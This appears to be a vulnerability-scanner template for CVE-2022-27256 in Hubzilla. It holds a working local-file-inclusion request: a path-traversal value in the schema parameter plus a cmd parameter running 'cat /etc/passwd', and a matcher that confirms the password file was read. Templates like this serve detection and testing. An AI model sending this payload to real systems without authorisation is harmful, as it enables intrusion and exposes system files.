id: CVE-2022-27256-lfi

info:
  name: LFI Vulnerability Check
  author: rix4uni
  severity: high
  description: Checks for Local File Inclusion vulnerabilities
  reference: https://volse.net/~haraldei/infosec/disclosures/hubzilla-before-7-2-multiple-vulnerabilities/
  tags: lfi

requests:
  - method: GET
    path:
      - '{{BaseURL}}/view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
          
      - type: status
        status:
          - 200